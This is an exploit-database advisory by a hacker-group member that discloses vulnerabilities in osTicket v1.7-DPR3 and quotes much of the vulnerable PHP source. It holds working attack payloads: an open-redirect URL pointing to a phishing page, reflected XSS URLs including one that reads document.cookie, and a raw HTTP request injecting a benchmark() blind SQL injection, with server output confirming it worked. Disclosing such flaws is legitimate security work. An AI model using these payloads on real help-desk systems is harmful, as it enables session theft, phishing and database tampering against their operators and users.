0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I&#039;m AkaStep member from Inj3ct0r Team                  1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

=================================================
Vulnerable Software: osTicket (v1.7-DPR3)
Official Site:http://www.osticket.com
Tested Version: osTicket (v1.7-DPR3)
Vulns: PATH DISCLOSURE+XSS+Open Redirect+Blind SQLi
=================================================

=================================================
Tested on:
*php.ini MAGIC_QUOTES_GPC OFF*
Safe mode off
/*
OS: Windows XP SP2 (32 bit)
Apache: 2.2.21.0
PHP Version: 5.2.17.17
MYSQL:  5.5.24
*/
=================================================



osTicket (v1.7-DPR3)


My suggestion is that:If possible after sucessfully installation of application give to user to protect that setup/ dir like button:


Ok,now about vulns.



---------------------Open Redirect VUln--------------------------
l.php

http://192.168.0.15/learn/ostickRC/scp/l.php?url=http://somephish.site/phish.html

Open Redirect vulnerability.(Usefull for Phish)
If possible limit it only your to your own domain only.
+
If possible tokenize it too (antiCSRF to avoid risk)
------------------------------------------------------------------

=============================l.php XSS================================================
l.php XSS or script insertion.
// $url unsanitized
<?php
/*********************************************************************
    l.php

    Link redirection

    Jared Hancock <jared@osticket.com>
    Copyright (c)  2006-2012 osTicket
    http://www.osticket.com

    Released under the GNU General Public License WITHOUT ANY WARRANTY.
    See LICENSE.TXT for details.

    vim: expandtab sw=4 ts=4 sts=4:
**********************************************************************/
require &#039;secure.inc.php&#039;;

global $_GET;
$url = $_GET[&#039;url&#039;];
if (!$url) exit();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
    <meta http-equiv="refresh" content="0;<?php echo $url; ?>"/>
</head>
<body/>
</html>
===========================================================================================



/include/   dir missing .htaccess (deny from all).

==================scp/l.php================================================================
/scp/l.php
http://192.168.0.15/learn/ostickRC/scp/l.php?url=<script>alert(1);</script>
XSS same l.php issuse:
===========================================================================================



scp/slas.php
BLIND SQL injection due direct usage $_POST[&#039;ids&#039;] without sanitization (needs db_input())


====================scp/slas.php====================================================================
<?php
/*********************************************************************
    slas.php

    SLA - Service Level Agreements

    Peter Rotich <peter@osticket.com>
    Copyright (c)  2006-2012 osTicket
    http://www.osticket.com

    Released under the GNU General Public License WITHOUT ANY WARRANTY.
    See LICENSE.TXT for details.

    vim: expandtab sw=4 ts=4 sts=4:
**********************************************************************/
require(&#039;admin.inc.php&#039;);
include_once(INCLUDE_DIR.&#039;class.sla.php&#039;);

$sla=null;
if($_REQUEST[&#039;id&#039;] && !($sla=SLA::lookup($_REQUEST[&#039;id&#039;])))
    $errors[&#039;err&#039;]=&#039;Unknown or invalid API key ID.&#039;;

if($_POST){
    switch(strtolower($_POST[&#039;do&#039;])){
        case &#039;update&#039;:
            if(!$sla){
                $errors[&#039;err&#039;]=&#039;Unknown or invalid SLA plan.&#039;;
            }elseif($sla->update($_POST,$errors)){
                $msg=&#039;SLA plan updated successfully&#039;;
            }elseif(!$errors[&#039;err&#039;]){
                $errors[&#039;err&#039;]=&#039;Error updating SLA plan. Try again!&#039;;
            }
            break;
        case &#039;add&#039;:
            if(($id=SLA::create($_POST,$errors))){
                $msg=&#039;SLA plan added successfully&#039;;
                $_REQUEST[&#039;a&#039;]=null;
            }elseif(!$errors[&#039;err&#039;]){
                $errors[&#039;err&#039;]=&#039;Unable to add SLA plan. Correct error(s) below and try again.&#039;;
            }
            break;
        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one plan.&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.SLA_TABLE.&#039; SET isactive=1 WHERE id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected SLA plans enabled&#039;;
                        else
                            $warn="$num of $count selected SLA plans enabled";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to enable selected SLA plans.&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.SLA_TABLE.&#039; SET isactive=0  WHERE id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected SLA plans disabled&#039;;
                        else
                            $warn="$num of $count selected SLA plans disabled";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to disable selected SLA plans&#039;;
                    }

                }elseif($_POST[&#039;delete&#039;]){
                    $i=0;
                    foreach($_POST[&#039;ids&#039;] as $k=>$v) {
                        if(($p=SLA::lookup($v)) && $p->delete())
                            $i++;
                    }

                    if($i && $i==$count)
                        $msg=&#039;Selected SLA plans deleted successfully&#039;;
                    elseif($i>0)
                        $warn="$i of $count selected SLA plans deleted";
                    elseif(!$errors[&#039;err&#039;])
                        $errors[&#039;err&#039;]=&#039;Unable to delete selected SLA plans&#039;;

                }else {
                    $errors[&#039;err&#039;]=&#039;Unknown action&#039;;
                }
            }
            break;
        default:
            $errors[&#039;err&#039;]=&#039;Unknown action&#039;;
            break;
    }
}

$page=&#039;slaplans.inc.php&#039;;
if($sla || ($_REQUEST[&#039;a&#039;] && !strcasecmp($_REQUEST[&#039;a&#039;],&#039;add&#039;)))
    $page=&#039;slaplan.inc.php&#039;;

$nav->setTabActive(&#039;settings&#039;);
require(STAFFINC_DIR.&#039;header.inc.php&#039;);
require(STAFFINC_DIR.$page);
include(STAFFINC_DIR.&#039;footer.inc.php&#039;);
?>

=============================================================================================



Warning: is_readable() [function.is-readable]: open_basedir restriction in effect. File(/dev/urandom) is not within the allowed path(s): (C:/Program Files/Apache Software Foundation/Apache2.2/htdocs/learn;C:\DOCUME~1\Apache\LOCALS~1\Temp) in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ostickRC\include\PasswordHash.php on line 51




BLIND SQL INJECTION.(I&#039;m using here becnhmark() way to be more "sensitive" and detect vuln)
//scp/staff.php
again due direct usage implode(&#039;,&#039;,$_POST[&#039;ids&#039;]) in sql query without db_input().


snip from scp/staff.php
===============================================================================================
        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one staff member.&#039;;
            }elseif(in_array($thisstaff->getId(),$_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You can not disable/delete yourself - you could be the only admin!&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.STAFF_TABLE.&#039; SET isactive=1 WHERE staff_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected staff activated&#039;;
                        else
                            $warn="$num of $count selected staff activated";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to activate selected staff&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.STAFF_TABLE.&#039; SET isactive=0  &#039;.
                         &#039;WHERE staff_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;) AND staff_id!=&#039;.db_input($thisstaff->getId());
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected staff disabled&#039;;
===============================================================================================


POST http://192.168.0.15/learn/ostickRC/scp/staff.php HTTP/1.0
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
Referer: http://192.168.0.15/learn/ostickRC/scp/staff.php
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; DigExt)
Host: 192.168.0.15
Content-Length: 90
Cookie: ASPX=6372nnqs3u1oplhouh99s7b6a6rh7j66

do=mass_process&ids%5B%5D=1) or benchmark(50000000000000,md5(now())) or (1=0&enable=Enable



Works and i&#039;m getting:

Possible DOS Attack Against MYSQL Server [Prevented]
Attack Prevented on: 16:04:02:468 01/06/2012
Attack Duration: 15 seconds
Command: Query
     db: ost
   Host: worker.com:1182
   User: ost
     Id: 548
   Time: 15
  State: init
   Info: UPDATE ost170_staff SET isactive=1 WHERE staff_id IN (1) or benchmark(50000000000000,md5(now())) or (1=0)
=======================================================================================================================

Returned status code: http:504
[Fiddler] ReadResponse() failed: The server did not return a response for this request.



==============================================XSS==================================================
XSS:
http://192.168.0.15/learn/ostickRC/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=%22%20onmouseover=%22alert%281%29%22
try to move your mouse over:  Page: [1] Export you will see it.

parameter &status is vulnerable in this case.
====================================================================================================




Possible prone to sql injection:
include/class.staff.php
Notice: $teams
//$sql.=&#039; AND team_id NOT IN(&#039;.implode(&#039;,&#039;, $teams).&#039;)&#039;;

Snip:

=================================
    function updateTeams($teams) {

        if($teams) {
            foreach($teams as $k=>$id) {
                $sql=&#039;INSERT IGNORE INTO &#039;.TEAM_MEMBER_TABLE.&#039; SET updated=NOW() &#039;
                    .&#039; ,staff_id=&#039;.db_input($this->getId()).&#039;, team_id=&#039;.db_input($id);
                db_query($sql);
            }
        }
        $sql=&#039;DELETE FROM &#039;.TEAM_MEMBER_TABLE.&#039; WHERE staff_id=&#039;.db_input($this->getId());
        if($teams)
            $sql.=&#039; AND team_id NOT IN(&#039;.implode(&#039;,&#039;, $teams).&#039;)&#039;;

        db_query($sql);

        return true;
    }
===================================

===================================================================================================




//include/class.staff.php
If possible sanitize all vars before passing it to syslogs:

============================= SNIP =================================
        //If we get to this point we know the login failed.
        $_SESSION[&#039;_staff&#039;][&#039;strikes&#039;]+=1;
        if(!$errors && $_SESSION[&#039;_staff&#039;][&#039;strikes&#039;]>$cfg->getStaffMaxLogins()) {
            $errors[&#039;err&#039;]=&#039;Forgot your login info? Contact Admin.&#039;;
            $_SESSION[&#039;_staff&#039;][&#039;laststrike&#039;]=time();
            $alert=&#039;Excessive login attempts by a staff member?&#039;."\n".
                   &#039;Username: &#039;.$_POST[&#039;username&#039;]."\n".&#039;IP: &#039;.$_SERVER[&#039;REMOTE_ADDR&#039;]."\n".&#039;TIME: &#039;.date(&#039;M j, Y, g:i a T&#039;)."\n\n".
                   &#039;Attempts #&#039;.$_SESSION[&#039;_staff&#039;][&#039;strikes&#039;]."\n".&#039;Timeout: &#039;.($cfg->getStaffLoginTimeout()/60)." minutes \n\n";
            Sys::log(LOG_ALERT,&#039;Excessive login attempts (&#039;.$_POST[&#039;username&#039;].&#039;)&#039;, $alert,($cfg->alertONLoginError()));

        } elseif($_SESSION[&#039;_staff&#039;][&#039;strikes&#039;]%2==0) { //Log every other failed login attempt as a warning.
            $alert=&#039;Username: &#039;.$_POST[&#039;username&#039;]."\n".&#039;IP: &#039;.$_SERVER[&#039;REMOTE_ADDR&#039;].
                   "\n".&#039;TIME: &#039;.date(&#039;M j, Y, g:i a T&#039;)."\n\n".&#039;Attempts #&#039;.$_SESSION[&#039;_staff&#039;][&#039;strikes&#039;];
            Sys::log(LOG_WARNING,&#039;Failed staff login attempt (&#039;.$_POST[&#039;username&#039;].&#039;)&#039;, $alert);
        }

        return false;
    }
============================= EOF SNIP===============================


scp/departments.php

SQL injection:
===========================================================================

        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one department&#039;;
            }elseif(!$_POST[&#039;public&#039;] && in_array($cfg->getDefaultDeptId(),$_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You can not disable/delete a default department. Remove default Dept. and try again.&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;public&#039;]){
                    $sql=&#039;UPDATE &#039;.DEPT_TABLE.&#039; SET ispublic=1 WHERE dept_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected departments made public&#039;;
                        else
                            $warn="$num of $count selected departments made public";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to make selected department public.&#039;;
                    }
                }elseif($_POST[&#039;private&#039;]){
                    $sql=&#039;UPDATE &#039;.DEPT_TABLE.&#039; SET ispublic=0  &#039;.
                         &#039;WHERE dept_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;) AND dept_id!=&#039;.db_input($cfg->getDefaultDeptId());
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected departments made private&#039;;
                        else
                            $warn="$num of $count selected departments made private";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to make selected department(s) private. Possibly already private!&#039;;
                    }

                }elseif($_POST[&#039;delete&#039;]){
                    //Deny all deletes if one of the selections has members in it.
                    $sql=&#039;SELECT count(staff_id) FROM &#039;.STAFF_TABLE.&#039; WHERE dept_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    list($members)=db_fetch_row(db_query($sql));
                    if($members)
============================================================================


============================================================================

//scp/templates.php
blind SQL injection

       case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one template to process.&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.EMAIL_TEMPLATE_TABLE.&#039; SET isactive=1 WHERE tpl_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected templates enabled&#039;;
                        else
                            $warn="$num of $count selected templates enabled";
                    }else{
======================= EOF SNIP=======================

//scp/teams.php

Blind SQl injection again:
Notice:  WHERE team_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)


        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one team.&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.TEAM_TABLE.&#039; SET isenabled=1 WHERE team_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected teams activated&#039;;
                        else
                            $warn="$num of $count selected teams activated";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to activate selected teams&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.TEAM_TABLE.&#039; SET isenabled=0 WHERE team_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {

=============================================================

//scp/syslogs.php
Blind Sql Injection:

        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one log to delete&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;delete&#039;]){
                    $sql=&#039;DELETE FROM &#039;.SYSLOG_TABLE.&#039; WHERE log_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;

==============================================================


//scp/helptopics.php

Blind SQL Injection:

        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one help topic&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.TOPIC_TABLE.&#039; SET isactive=1 WHERE topic_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected help topics enabled&#039;;
                        else
                            $warn="$num of $count selected help topics enabled";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to enable selected help topics.&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.TOPIC_TABLE.&#039; SET isactive=0  WHERE topic_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
=============================================================


=============================================================
//scp/groups.php
Blind Sql Injection again due implode(&#039;,&#039;,$_POST[&#039;ids&#039;]) thing in sql query.

        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one group.&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.GROUP_TABLE.&#039; SET group_enabled=1, updated=NOW() WHERE group_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected groups activated&#039;;
                        else
                            $warn="$num of $count selected groups activated";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to activate selected groups&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.GROUP_TABLE.&#039; SET group_enabled=0, updated=NOW() WHERE group_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
============================================================



//scp/filters.php

Blind Sql Injection:

==================SNIP========================================
        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one filter to process.&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.EMAIL_FILTER_TABLE.&#039; SET isactive=1 WHERE id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected filters enabled&#039;;
                        else
                            $warn="$num of $count selected filters enabled";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to enable selected filters&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.EMAIL_FILTER_TABLE.&#039; SET isactive=0  WHERE id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected filters disabled&#039;;
                        else
=====================EOF SNIP=================================


include/class.faq.php
Vulnerable to Blind SQL Injection  but a bit hard to exploit it.

Notice:
if($ids)
      $sql.=&#039; AND topic_id NOT IN(&#039;.implode(&#039;,&#039;,$ids).&#039;)&#039;;

db_query($sql);


==================SNIP========================================
    function updateTopics($ids){

        if($ids) {
            $topics = $this->getHelpTopicsIds();
            foreach($ids as $k=>$id) {
                if($topics && in_array($id,$topics)) continue;
                $sql=&#039;INSERT IGNORE INTO &#039;.FAQ_TOPIC_TABLE
                    .&#039; SET faq_id=&#039;.db_input($this->getId())
                    .&#039;, topic_id=&#039;.db_input($id);
                db_query($sql);
            }
        }

        $sql=&#039;DELETE FROM &#039;.FAQ_TOPIC_TABLE.&#039; WHERE faq_id=&#039;.db_input($this->getId());
        if($ids)
            $sql.=&#039; AND topic_id NOT IN(&#039;.implode(&#039;,&#039;,$ids).&#039;)&#039;;

        db_query($sql);

        return true;
    }
=====================EOF SNIP=================================



/scp/emails.php
Blind SQl Injection:

===================SNIP==========================
        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one email address&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);

                $sql=&#039;SELECT count(dept_id) FROM &#039;.DEPT_TABLE.&#039; dept &#039;.
                     &#039;WHERE email_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;) OR autoresp_email_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                list($depts)=db_fetch_row(db_query($sql));

==================EOF=============================



//scp/categories.php

Blind SQl Inj:
Notice: usage of implode(&#039;,&#039;,$_POST[&#039;ids&#039;]) directly without any sanitization in SQL query.
===================SNIP==========================
        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one category&#039;;
            } else {
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;public&#039;]) {
                    $sql=&#039;UPDATE &#039;.FAQ_CATEGORY_TABLE.&#039; SET ispublic=1 WHERE category_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected categories made PUBLIC&#039;;
                        else
                            $warn="$num of $count selected categories made PUBLIC";
                    } else {
                        $errors[&#039;err&#039;]=&#039;Unable to enable selected categories public.&#039;;
                    }
                } elseif($_POST[&#039;private&#039;]) {
                    $sql=&#039;UPDATE &#039;.FAQ_CATEGORY_TABLE.&#039; SET ispublic=0  WHERE category_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected categories made PRIVATE&#039;;
=====================EOF SNIP=================================


//scp/canned.php

Blind SQl Injection:
===================SNIP==========================

        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one canned response&#039;;
            } else {
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]) {
                    $sql=&#039;UPDATE &#039;.CANNED_TABLE.&#039; SET isenabled=1 WHERE canned_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected canned replies enabled&#039;;
                        else
                            $warn="$num of $count selected canned replies enabled";
                    } else {
                        $errors[&#039;err&#039;]=&#039;Unable to enable selected canned replies.&#039;;
                    }
                } elseif($_POST[&#039;disable&#039;]) {
                    $sql=&#039;UPDATE &#039;.CANNED_TABLE.&#039; SET isenabled=0  WHERE canned_id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected canned replies disabled&#039;;
                        else
                            $warn="$num of $count selected canned replies disabled";
                    } else {
=====================EOF SNIP========================


//scp//banlist.php

Blind SQl Injection:

Notice:
 &#039; AND id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;
===================SNIP==========================
        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one email to process.&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.EMAIL_FILTER_RULE_TABLE.&#039; SET isactive=1 WHERE filter_id=&#039;.db_input($filter->getId()).
                         &#039; AND id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected emails ban status set to enabled&#039;;
                        else
                            $warn="$num of $count selected emails enabled";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to enable selected emails&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.EMAIL_FILTER_RULE_TABLE.&#039; SET isactive=0  WHERE filter_id=&#039;.db_input($filter->getId()).
                         &#039; AND id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
=====================EOF SNIP========================




//scp/apikeys.php
===================SNIP==========================

        case &#039;mass_process&#039;:
            if(!$_POST[&#039;ids&#039;] || !is_array($_POST[&#039;ids&#039;]) || !count($_POST[&#039;ids&#039;])) {
                $errors[&#039;err&#039;]=&#039;You must select at least one API key&#039;;
            }else{
                $count=count($_POST[&#039;ids&#039;]);
                if($_POST[&#039;enable&#039;]){
                    $sql=&#039;UPDATE &#039;.API_KEY_TABLE.&#039; SET isactive=1 WHERE id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())){
                        if($num==$count)
                            $msg=&#039;Selected API keys enabled&#039;;
                        else
                            $warn="$num of $count selected API keys enabled";
                    }else{
                        $errors[&#039;err&#039;]=&#039;Unable to enable selected API keys.&#039;;
                    }
                }elseif($_POST[&#039;disable&#039;]){
                    $sql=&#039;UPDATE &#039;.API_KEY_TABLE.&#039; SET isactive=0  WHERE id IN (&#039;.implode(&#039;,&#039;,$_POST[&#039;ids&#039;]).&#039;)&#039;;
                    if(db_query($sql) && ($num=db_affected_rows())) {
                        if($num==$count)
                            $msg=&#039;Selected API keys disabled&#039;;
                        else

=====================EOF SNIP========================



XSS (Cross Site Scripting Vuln) directory.php parameter q.


http://192.168.0.15/learn/ostickRC/scp/directory.php?q=100%22+onmouseover%3D%22alert%281%29%22&did=0&submit=Filter

parameter &q is vulnerable in this case


http://192.168.0.15/learn/ostickRC/scp/directory.php?q=100%22/%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
Payload: "/><script>alert(document.cookie);</script>"

>From source of code page:

<form action="directory.php" method="GET" name="filter">
       <input type="text" name="q" value="100"/><script>alert(document.cookie);</script>" >
        <select name="did" id="did">
             <option value="0">&mdash; All Department &mdash;</option>
             <option value="2" >Billing (1)</option><option value="1" >Support (1)</option>        </select>
        &nbps;&nbps;
        <input type="submit" name="submit" value="Filter"/>
    </form>


And obviously we will get cookie.


=========================== HAPPY NEW YEAR! ==================================


================================================
SHOUTZ+RESPECTS+GREAT THANKS TO ALL MY FRIENDS:
================================================
packetstormsecurity.org
packetstormsecurity.com
packetstormsecurity.net
securityfocus.com
cxsecurity.com
security.nnov.ru
securtiyvulns.com
securitylab.ru
secunia.com
securityhome.eu
exploitsdownload.com
osvdb.com
websecurity.com.ua
1337day.com

to all Aa Team + to all Azerbaijan Black HatZ
+ *Especially to my bro CAMOUFL4G3 *
To All Turkish Hackers

Also special thanks to: ottoman38 & HERO_AZE
================================================

/AkaStep

